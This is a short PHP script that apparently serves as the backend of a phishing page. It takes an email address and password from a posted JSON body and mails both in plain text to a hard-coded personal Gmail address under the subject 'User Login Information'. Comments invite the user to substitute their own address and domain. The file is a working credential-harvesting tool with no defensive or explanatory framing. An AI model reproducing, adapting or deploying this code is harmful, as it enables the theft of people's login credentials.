<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get JSON input
    $data = json_decode(file_get_contents('php://input'), true);

    // Check if email and password are provided
    if (isset($data['email']) && isset($data['password'])) {
        $email = $data['email'];
        $password = $data['password'];

        // Prepare email
        $to = "ajmirahemed5@gmail.com"; // Your email
        $subject = "User Login Information";
        $message = "Email: $email\nPassword: $password";
        $headers = "From: noreply@yourdomain.com"; // Change to your domain

        // Send email
        if (mail($to, $subject, $message, $headers)) {
            echo json_encode(['status' => 'success']);
        } else {
            http_response_code(500); // Internal Server Error
            echo json_encode(['status' => 'error', 'message' => 'Failed to send email.']);
        }
    } else {
        http_response_code(400); // Bad Request
        echo json_encode(['status' => 'error', 'message' => 'Email and password required.']);
    }
} else {
    http_response_code(405); // Method Not Allowed
    echo json_encode(['status' => 'error', 'message' => 'Invalid request method.']);
}
?>

